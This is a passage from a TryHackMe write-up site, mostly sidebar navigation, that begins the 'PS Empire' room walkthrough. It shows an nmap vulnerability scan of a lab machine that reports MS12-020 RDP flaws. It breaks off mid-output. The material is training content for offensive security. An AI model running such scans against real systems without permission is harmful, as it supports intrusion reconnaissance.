Enumeration/">Linux: Local Enumeration</a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/Tryhackme/Linux PrivEsc/ Linux PrivEsc/">Linux PrivEsc</a></div></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Looking Glass/">Looking Glass</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Madness/">Madness</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Magician/">Magician</a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/Tryhackme/Metaspliot/Metasploit/">Metaspliot</a></div></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Mindgames/">Mindgames</a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/Tryhackme/Misguided Ghosts/Misguided Ghost/">Misguided Ghosts</a></div></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Mnemonic/">Mnemonic</a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" aria-expanded="false" tabindex="0" href="/writeups/Tryhackme/Motunui/">Motunui</a><button aria-label="Toggle the collapsible sidebar category &#x27;Motunui&#x27;" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Mr Robot CTF/">Mr Robot CTF</a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/Tryhackme/Musical Stego/ Musical Stego/">Musical Stego</a></div></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/NIS - Linux Part I/">NIS - Linux Part I</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Nax/">Nax</a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/Tryhackme/NerdHerd/NerdHeard/">NerdHerd</a></div></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Nessus/">Nessus</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Network Services/">Network Services</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Networking/">Networking</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Ninja Skills/">Ninja Skills</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Nmap/">Nmap</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/OWASP Top 10/">OWASP Top 10</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/OWASP ZAP/">Introduction to OWASP ZAP</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/OhSINT/">OhSINT</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/One Piece/">One Piece</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Overpass/">Overpass</a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/Tryhackme/Overpass 2 - Hacked/Overpass 2/">Overpass 2 - Hacked</a></div></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link menu__link--active" aria-current="page" tabindex="0" href="/writeups/Tryhackme/PS Empire/">PS Empire</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Peak Hill/">Peak Hill</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Persistence/">Persistence</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Pickle Rick/">Pickle Rick</a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/Tryhackme/Post-Exploitation Basics/Post Exploitation Basics/">Post-Exploitation Basics</a></div></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Poster/">Poster</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Printer Hacking 101/">Printer Hacking 101</a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/Tryhackme/Psycho Break/Pyscho Break/">Psycho Break</a></div></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Python Playground/">Python Playground</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Ra/">Ra</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Ra 2/">Ra 2</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Racetrack Bank/">Racetrack Bank</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Recovery/">Recovery</a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/Tryhackme/Relevant/Relevent/">Relevant</a></div></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Res/">Res</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Retro/">Retro</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Revenge/">Revenge</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Reverse Engineering/">Reverse Engineering</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Reversing ELF/">Reversing ELF</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/RootMe/">RootMe</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/SSRF/">SSRF</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Scripting/">Scripting</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Set/">Set</a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/Tryhackme/Shodan.io/Shodan/">Shodan.io</a></div></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Simple CTF/">Simple CTF</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Skynet/">Skynet</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Smag Grotto/">Smag Grotto</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Source/">Source</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Splunk/">Splunk</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Spring/">Spring</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Starting Out In Cyber Sec/">Starting Out In Cyber Sec</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Startup/">Startup</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Steel Mountain/">Steel Mountain</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/StuxCTF/">StuxCTF</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Sublist3r/">Sublist3r</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Sudo Buffer Overflow/">Sudo Buffer Overflow</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Sudo Security Bypass/">Sudo Security Bypass</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Symfonos6/">symfonos6</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Tartarus/">Tartarus</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Tempus Fugit Durius/">Tempus Fugit Durius</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/The Blob Blog/">The Blob Blog</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/The Docker Rodeo/">The Docker Rodeo</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/The Impossible Challenge/">The Impossible Challenge</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/The Marketplace/">The Marketplace</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/The Server From Hell/">The Server From Hell</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/The find command/">The find command</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Thompson/">Thompson</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Tmux/">tmux</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Tomghost/">tomghost</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Tony the Tiger/">Tony the Tiger</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/ToolsRus/">ToolsRus</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Tor/">Tor</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Tutorial/">Tutorial</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Undiscovered/">Undiscovered</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Upload Vulnerabilities/">Upload Vulnerabilities</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/WWBuddy/">WWBuddy</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Web Fundamentals/">Web Fundamentals</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Web Scanning/">Web Scanning</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/WebAppSec 101/">WebAppSec 101</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Wgel CTF/">Wgel CTF</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Willow/">Willow</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Windows PrivEsc Arena/">Windows PrivEsc Arena</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Wireshark 101/">Wireshark 101</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Wonderland/">Wonderland</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/XXE/">XXE</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Year of the Dog/">Year of the Dog</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Year of the Fox/">Year of the Fox</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Year of the Pig/">Year of the Pig</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Year of the Rabbit/">Year of the Rabbit</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Zero Logon/">Zero Logon</a></li></ul></li></ul></nav><button type="button" title="Collapse sidebar" aria-label="Collapse sidebar" class="button button--secondary button--outline collapseSidebarButton_PEFL"><svg width="20" height="20" aria-hidden="true" class="collapseSidebarButtonIcon_kv0_"><g fill="#7a7a7a"><path d="M9.992 10.023c0 .2-.062.399-.172.547l-4.996 7.492a.982.982 0 01-.828.454H1c-.55 0-1-.453-1-1 0-.2.059-.403.168-.551l4.629-6.942L.168 3.078A.939.939 0 010 2.528c0-.548.45-.997 1-.997h2.996c.352 0 .649.18.828.45L9.82 9.472c.11.148.172.347.172.55zm0 0"></path><path d="M19.98 10.023c0 .2-.058.399-.168.547l-4.996 7.492a.987.987 0 01-.828.454h-3c-.547 0-.996-.453-.996-1 0-.2.059-.403.168-.551l4.625-6.942-4.625-6.945a.939.939 0 01-.168-.55 1 1 0 01.996-.997h3c.348 0 .649.18.828.45l4.996 7.492c.11.148.168.347.168.55zm0 0"></path></g></svg></button></div></div></aside><main class="docMainContainer_gTbr"><div class="container padding-top--md padding-bottom--lg"><div class="row"><div class="col docItemCol_VOVn"><div class="docItemContainer_Djhp"><article><nav class="theme-doc-breadcrumbs breadcrumbsContainer_Z_bl" aria-label="Breadcrumbs"><ul class="breadcrumbs" itemscope="" itemtype="https://schema.org/BreadcrumbList"><li class="breadcrumbs__item"><a aria-label="Home page" class="breadcrumbs__link" href="/"><svg viewBox="0 0 24 24" class="breadcrumbHomeIcon_YNFT"><path d="M10 19v-5h4v5c0 .55.45 1 1 1h3c.55 0 1-.45 1-1v-7h1.7c.46 0 .68-.57.33-.87L12.67 3.6c-.38-.34-.96-.34-1.34 0l-8.36 7.53c-.34.3-.13.87.33.87H5v7c0 .55.45 1 1 1h3c.55 0 1-.45 1-1z" fill="currentColor"></path></svg></a></li><li class="breadcrumbs__item"><span class="breadcrumbs__link">Tryhackme</span><meta itemprop="position" content="1"></li><li itemscope="" itemprop="itemListElement" itemtype="https://schema.org/ListItem" class="breadcrumbs__item breadcrumbs__item--active"><span class="breadcrumbs__link" itemprop="name">PS Empire</span><meta itemprop="position" content="2"></li></ul></nav><div class="tocCollapsible_ETCw theme-doc-toc-mobile tocMobile_ITEo"><button type="button" class="clean-btn tocCollapsibleButton_TO0P">On this page</button></div><div class="theme-doc-markdown markdown"><h1>PS Empire</h1><p>Learn how to use Powershell Empire, a powerful post-exploitation framework.</p><p><a href="https://tryhackme.com/room/rppsempire" target="_blank" rel="noopener noreferrer">PS Empire</a></p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="deploy">Deploy!<a href="#deploy" class="hash-link" aria-label="Direct link to Deploy!" title="Direct link to Deploy!">​</a></h2><p>Deploy this machine and discover what exploit this machine is vulnerable to. (Hint hint, this notice the VM name. I recommend completing the room &#x27;Blue&#x27; prior to this room for this purpose alone.)</p><hr><p>Enjoy the room! For future rooms and write-ups, follow <a href="https://twitter.com/darkstar7471" target="_blank" rel="noopener noreferrer">@darkstar7471</a> on Twitter.</p><ol><li>Deploy this machine and learn what exploitation this box is susceptible to!</li></ol><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">kali@kali:~/CTFs/tryhackme/PS Empire$ sudo nmap -A -p- --script vuln 10.10.80.135</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-03 22:18 CEST</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Pre-scan script results:</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">| broadcast-avahi-dos: </span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|   Discovered hosts:</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|     224.0.0.251</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|   After NULL UDP avahi packet DoS (CVE-2011-1002).</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|_  Hosts are all up (not vulnerable).</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Nmap scan report for 10.10.80.135</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Host is up (0.032s latency).</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Not shown: 65526 closed ports</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">PORT      STATE SERVICE            VERSION</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">135/tcp   open  msrpc              Microsoft Windows RPC</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|_clamav-exec: ERROR: Script execution failed (use -d to debug)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|_clamav-exec: ERROR: Script execution failed (use -d to debug)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">445/tcp   open  microsoft-ds       Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|_clamav-exec: ERROR: Script execution failed (use -d to debug)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">3389/tcp  open  ssl/ms-wbt-server?</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|_clamav-exec: ERROR: Script execution failed (use -d to debug)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">| rdp-vuln-ms12-020: </span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|   VULNERABLE:</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|   MS12-020 Remote Desktop Protocol Denial Of Service Vulnerability</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|     State: VULNERABLE</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|     IDs:  CVE:CVE-2012-0152</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|     Risk factor: Medium  CVSSv2: 4.3 (MEDIUM) (AV:N/AC:M/Au:N/C:N/I:N/A:P)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|           Remote Desktop Protocol vulnerability that could allow remote attackers to cause a denial of service.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|           </span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|     Disclosure date: 2012-03-13</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|     References:</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-0152</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|       http://technet.microsoft.com/en-us/security/bulletin/ms12-020</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|   </span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|   MS12-020 Remote Desktop Protocol Remote Code Execution Vulnerability</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|     State: VULNERABLE</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|     IDs:  CVE:CVE-2012-0002</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|     Risk factor: High  CVSSv2: 9.3 (HIGH) (AV:N/AC:M/Au:N/C:C/I:C/A:C)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|           Remote Desktop Protocol vulnerability that could allow remote attackers to execute arbitrary code on the targeted system.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|           </span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|     Disclosure date: 2012-03-13</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|     References:</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-0002</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|_      http://technet.microsoft.com/en-us/security/bulletin/ms12-020</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|_sslv2-drown: </span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">49152/tcp open  msrpc              Microsoft Windows RPC</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|_clamav-exec: ERROR: Script execution failed (use -d to debug)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">49153/tcp open  msrpc              Microsoft Windows RPC</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|_clamav-exec: ERROR: Script execution failed (use -d to debug)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">49154/tcp open  msrpc              Microsoft Windows RPC</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|_clamav-exec: ERROR: Script execution failed (use -d to debug)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">49158/tcp open  msrpc              Microsoft Windows RPC</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|_clamav-exec: ERROR: Script execution failed (use -d to debug)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">49160/tcp open  msrpc              Microsoft Windows RPC</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|_clamav-exec: ERROR: Script execution failed (use -d to debug)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">TCP/IP fingerprint:</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">OS:SCAN(V=7.80%E=4%D=10/3%OT=135%CT=1%CU=36932%PV=Y%DS=2%DC=T%G=Y%TM=5F78DD</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">OS:56%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=10B%TI=I%CI=I%II=I%SS=S%TS</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">OS:=7)OPS(O1=M508NW8ST11%O2=M508NW8ST11%O3=M508NW8NNT11%O4=M508NW8ST11%O5=M</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">OS:508NW8ST11%O6=M508ST11)WIN(W1=2000%W2=2000%W3=2000%W4=2000%W5=2000%W6=20</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">OS:00)ECN(R=Y%DF=Y%T=80%W=2000%O=M508NW8NNS%CC=N%Q=)T1(R=Y%DF=Y%T=80%S=O%A=</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token 